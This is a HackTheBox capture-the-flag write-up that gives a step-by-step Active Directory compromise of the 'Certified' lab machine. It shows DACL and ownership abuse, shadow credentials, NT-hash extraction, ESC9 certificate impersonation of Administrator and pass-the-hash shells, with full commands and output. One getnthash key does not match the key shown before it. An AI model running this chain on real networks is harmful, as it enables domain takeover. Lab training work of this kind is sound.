---
title: "Certified"
date: 2025-05-21
categories:
  - HackTheBox
  - Active Directory
tags:
  - HackTheBox
  - Active Directory
---

# Certified

![](../assets/Pasted%20image%2020250521201330.png)
<!-- more -->

## Machine Information

As is common in Windows pentests, you will start the Certified box with credentials for the following account:  
Username: `judith.mader` Password: `judith09`

## Enumeration

```shell
$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.10.11.41 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-21 20:14 CEST
Nmap scan report for 10.10.11.41
Host is up (0.041s latency).
Not shown: 65515 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        (generic dns response: SERVFAIL)
| fingerprint-strings: 
|   DNS-SD-TCP: 
|     _services
|     _dns-sd
|     _udp
|_    local
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-22 01:15:13Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-22T01:16:46+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
|_ssl-date: 2025-05-22T01:16:47+00:00; +7h00m01s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-22T01:16:46+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-22T01:16:47+00:00; +7h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC01.certified.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certified.htb
| Not valid before: 2024-05-13T15:49:36
|_Not valid after:  2025-05-13T15:49:36
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49683/tcp open  msrpc         Microsoft Windows RPC
49716/tcp open  msrpc         Microsoft Windows RPC
49740/tcp open  msrpc         Microsoft Windows RPC
```

Get users and make a list.

![](../assets/Pasted%20image%2020250521204209.png)

With `ldapsearch`, get all the users.

```shell
$ ldapsearch -x -H ldap://certified.htb -D "certified\judith.mader" -W -b "DC=certified,DC=htb" "(objectClass=user)"
...
# DC01, Domain Controllers, certified.htb
dn: CN=DC01,OU=Domain Controllers,DC=certified,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
objectClass: computer
cn: DC01
userCertificate:: MIIGPzCCBSegAwIBAgITeQAAAAIvfMdjJV9GkQAAAAAAAjANBgkqhkiG9w0B
 AQsFADBMMRMwEQYKCZImiZPyLGQBGRYDaHRiMRkwFwYKCZImiZPyLGQBGRYJY2VydGlmaWVkMRowG
 AYDVQQDExFjZXJ0aWZpZWQtREMwMS1DQTAeFw0yNDA1MTMxNTQ5MzZaFw0yNTA1MTMxNTQ5MzZaMB
 0xGzAZBgNVBAMTEkRDMDEuY2VydGlmaWVkLmh0YjCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQo
 CggEBAMx/FhgH36heOUjpNhO4JWYXE0zDwpKfx3dfqvEqTvIfRLpptNUCfkaeZijP+YAlUMNSNUvg
 FLZ7yuZf3ubIcEv8wXMlABwpVxe3NtOzLXQhNypU/W53DgYZoD9ueC3ob6f4jI6dN6jKt4gV/pBmo
 X3iKy0XmrIaMkO8W20gzJtf8RaZYChHzhilGs3TwkKmBkZFt4+KeTkCbBE4T8zka8l652hfOhdz5Y
 OU82eviJuTQqaprVtognmW6EV2C7laO+UvQy2VwZc9L+6A42t5Pz2Ee+28xaBIGAgNn5TMcS+oJC0
 qhnAFNazT2X4p0aq3WBlF5BMwadrEwk59t4VcRc0CAwEAAaOCA0cwggNDMC8GCSsGAQQBgjcUAgQi
 HiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIK
 wYBBQUHAwEwDgYDVR0PAQH/BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA
 4GCCqGSIb3DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjALBgl
 ghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFPTg6Uo2pYQv7jJTC9x7Reo9
 CbVVMB8GA1UdIwQYMBaAFOz7EkAVob3H0S47Lk1LcsBi3yv1MIHOBgNVHR8EgcYwgcMwgcCggb2gg
 bqGgbdsZGFwOi8vL0NOPWNlcnRpZmllZC1EQzAxLUNBLENOPURDMDEsQ049Q0RQLENOPVB1YmxpYy
 UyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Y2VydGlmaWV
 kLERDPWh0Yj9jZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlz
 dHJpYnV0aW9uUG9pbnQwgcUGCCsGAQUFBwEBBIG4MIG1MIGyBggrBgEFBQcwAoaBpWxkYXA6Ly8vQ
 049Y2VydGlmaWVkLURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPV
 NlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Y2VydGlmaWVkLERDPWh0Yj9jQUNlcnRpZmljYXR
 lP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTA+BgNVHREENzA1oB8GCSsG
 AQQBgjcZAaASBBBTwp5mQoxFT6ExYzeAVBiughJEQzAxLmNlcnRpZmllZC5odGIwTgYJKwYBBAGCN
 xkCBEEwP6A9BgorBgEEAYI3GQIBoC8ELVMtMS01LTIxLTcyOTc0Njc3OC0yNjc1OTc4MDkxLTM4Mj
 AzODgyNDQtMTAwMDANBgkqhkiG9w0BAQsFAAOCAQEAk4PE1BZ/qAgrUyzYM5plxxgUpGbICaWEkDk
 yiu7uCaTOehQ4rITZE1xefpHWVVEULz9UqlozCQgaKy3BRQsUjMZgkcQt0D+5Ygnri/+M3adcYWpJ
 Hsk+gby/JShvztRj1wS/X6SEErDaf9Nw0jgZi3QCaNqH2agxwj+oA+mCMd5mBq7JtWcCI3wQ3xuEa
 OEd9Q86T/J4ZdGC+8iQKt3GrvHzTEDijK9zWxm8nuftG/AyBU0N23xJCLgWZkQUfgVn+2b7pjWIPA
 WdZv8WqcJV1tinG0oM83wgbg3Nv3ZeoEwDCs5MgYprXNImNGtIzQY41iYatWCKZW54Ylno2wj9tg=
 =
distinguishedName: CN=DC01,OU=Domain Controllers,DC=certified,DC=htb
....
msDS-SupportedEncryptionTypes: 28
msDS-GenerationId:: INcb22axygg=
msDFSR-ComputerReferenceBL: CN=DC01,CN=Topology,CN=Domain System Volume,CN=DFS
 R-GlobalSettings,CN=System,DC=certified,DC=htb
```

Using `bloodhound-ce-python`, collect the data and import it into BloodHound.

![](../assets/Pasted%20image%2020250521231442.png)

## Initial Access

First, make `judith` the owner of the `management` group by abusing `WriteOwner`.

```shell
$ impacket-owneredit -action write -new-owner 'judith.mader' -target 'management' 'certified.htb'/'judith.mader':'judith09'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Current owner information below
[*] - SID: S-1-5-21-729746778-2675978091-3820388244-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=certified,DC=htb
[*] OwnerSid modified successfully!
```

Then edit the DACL to be able to edit members.

```shell
$ impacket-dacledit -dc-ip 10.10.11.41 certified.htb/judith.mader:judith09 -action write -rights WriteMembers -principal judith.mader -target management
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20250522-131845.bak
[*] DACL modified successfully!
```

Now add `judith` to the group

```shell
$ net rpc group addmem "management" "judith.mader" -U "certified.htb/judith.mader%judith09" -S dc01.certified.htb
```

Then, perform a shadow credentials attack over the `management_svc` account by abusing `GenericWrite`.

```shell
$ python pywhisker/pywhisker/pywhisker.py -d certified.htb -u judith.mader -p judith09 --target management_svc --action add --filename management_svc
[*] Searching for the target account
[*] Target user found: CN=management service,CN=Users,DC=certified,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: d982a5f5-268e-b993-565a-7fd605c01d1f
[*] Updating the msDS-KeyCredentialLink attribute of management_svc
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: management_svc.pfx
[+] PFX exportiert nach: management_svc.pfx
[i] Passwort für PFX: n1jtA5vBiOpObIKTJ4gA
[+] Saved PFX (#PKCS12) certificate & key at path: management_svc.pfx
[*] Must be used with password: n1jtA5vBiOpObIKTJ4gA
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

Now, using `gettgtpkinit.py` and `getnthash.py`, get a ticket and obtain the NTLM hash.

```shell
$ python gettgtpkinit.py -cert-pfx management_svc.pfx -pfx-pass n1jtA5vBiOpObIKTJ4gA certified.htb/management_svc management_svc.ccache
2025-05-23 00:19:13,849 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-05-23 00:19:13,874 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2025-05-22 17:19:17,395 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2025-05-22 17:19:17,395 minikerberos INFO     75397ef592192d344219ea4a890a2b65c1ebe1a8d3ca82a36b9891fc29b6fa4b
INFO:minikerberos:75397ef592192d344219ea4a890a2b65c1ebe1a8d3ca82a36b9891fc29b6fa4b
2025-05-22 17:19:17,397 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

```shell
$ export KRB5CCNAME=management_svc.ccache
```

```shell
$ python getnthash.py -key 75397ef592192d344219ea4a890a2b65c1ebe1a8d3ca82a36b9891fc29b6fa4b certified.htb/management_svc
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
a091c1832bcdd4677c28b5a6a1295584
```

```shell
$ evil-winrm -i certified.htb -u management_svc -H a091c1832bcdd4677c28b5a6a1295584

Evil-WinRM shell v3.7

*Evil-WinRM* PS C:\Users\management_svc\Documents> whoami
certified\management_svc
```

Get the flag

```shell
*Evil-WinRM* PS C:\Users\management_svc\Desktop> type user.txt
cb15cf06b36bc8455912ebf17e785e9e
```

## Privilege Escalation

![](../assets/Pasted%20image%2020250522172756.png)

The user has `GenericAll` over `ca_operator`.

```shell
$ python pywhisker/pywhisker/pywhisker.py -d certified.htb -u management_svc -H a091c1832bcdd4677c28b5a6a1295584 --target ca_operator --action add --filename ca_operator
[*] Searching for the target account
[*] Target user found: CN=operator ca,CN=Users,DC=certified,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 2b7e4043-ec2b-dab2-4602-7d5384bd420c
[*] Updating the msDS-KeyCredentialLink attribute of ca_operator
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: ca_operator.pfx
[+] PFX exportiert nach: ca_operator.pfx
[i] Passwort für PFX: K6DBzJkZhDRrsjH5ugGO
[+] Saved PFX (#PKCS12) certificate & key at path: ca_operator.pfx
[*] Must be used with password: K6DBzJkZhDRrsjH5ugGO
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

```shell
$ python gettgtpkinit.py -cert-pfx ca_operator.pfx -pfx-pass K6DBzJkZhDRrsjH5ugGO certified.htb/ca_operator ca_operator.ccache
2025-05-23 03:09:50,320 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-05-23 03:09:50,347 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2025-05-22 20:10:00,603 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2025-05-22 20:10:00,604 minikerberos INFO     5e900797e2ee30cadf8284cf5425827acc35e59532b905f4ff6dea1b9a758993
INFO:minikerberos:5e900797e2ee30cadf8284cf5425827acc35e59532b905f4ff6dea1b9a758993
2025-05-22 20:10:00,606 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

```shell
$ export KRB5CCNAME=ca_operator.ccache
```

```shell
$ python getnthash.py -key e56fd78b3fe6abbbb62f4819e7fd295a5a4acf9d778bcaab4fbf3e7cf9d923b0 certified.htb/ca_operator
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
b4b86f45c6018f1b664f70805f45d8f2
```

We know that ADCS (Active Directory Certificate Service) is running on the Domain Controller, so scan for certificate vulnerabilities with `certipy`.

```shell
$ certipy-ad find -dc-ip 10.10.11.41 -ns 10.10.11.41 -u ca_operator -hashes b4b86f45c6018f1b664f70805f45d8f2 -vulnerable -stdout
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 15 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'certified-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'certified-DC01-CA'
[*] Checking web enrollment for CA 'certified-DC01-CA' @ 'DC01.certified.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : certified-DC01-CA
    DNS Name                            : DC01.certified.htb
    Certificate Subject                 : CN=certified-DC01-CA, DC=certified, DC=htb
...
        Enrollment Rights               : CERTIFIED.HTB\operator ca
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : CERTIFIED.HTB\Administrator
        Full Control Principals         : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        Write Owner Principals          : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        Write Dacl Principals           : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        Write Property Enroll           : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
    [+] User Enrollable Principals      : CERTIFIED.HTB\operator ca
    [!] Vulnerabilities
      ESC9                              : Template has no security extension.
    [*] Remarks
      ESC9                              : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
```

There is an ESC9 vulnerability, which allows us to change a user's UPN. Let's change `ca_operator`'s UPN to `Administrator` and request a certificate.

First, change `ca_operator`'s UPN

```shell
$ certipy-ad account update -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator

Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: CERTIFIED.HTB.
[!] Use -debug to print a stacktrace
[*] Updating user 'ca_operator':
    userPrincipalName                   : Administrator
[*] Successfully updated 'ca_operator'
```

Get the admin's certificate

```shell
$ certipy-ad req -username ca_operator@certified.htb -hashes b4b86f45c6018f1b664f70805f45d8f2 -ca certified-DC01-CA  -template CertifiedAuthentication
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: CERTIFIED.HTB.
[!] Use -debug to print a stacktrace
[*] Requesting certificate via RPC
[*] Request ID is 7
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx
```

Restore `ca_operator`'s UPN

```shell
$ certipy-ad account update -username management_svc@certified.htb -hashes a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator  
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: CERTIFIED.HTB.
[!] Use -debug to print a stacktrace
[*] Updating user 'ca_operator':
    userPrincipalName                   : ca_operator
[*] Successfully updated 'ca_operator'
```

Get the NTLM hash

```shell
$ certipy-ad auth -pfx administrator.pfx -domain certified.htb -dc-ip 10.10.11.41
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator'
[*] Using principal: 'administrator@certified.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34
```

Enter the host via `evil-winrm`

```shell
$ evil-winrm -i certified.htb -u administrator -H 0d5b49608bbce1751f708748f67e2d34

Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
certified\administrator
```

## Post Exploitation

Get the flag

```shell
*Evil-WinRM* PS C:\Users\Administrator\desktop> type root.txt
f4923a975d690a09cf241ea2c931ac53
```
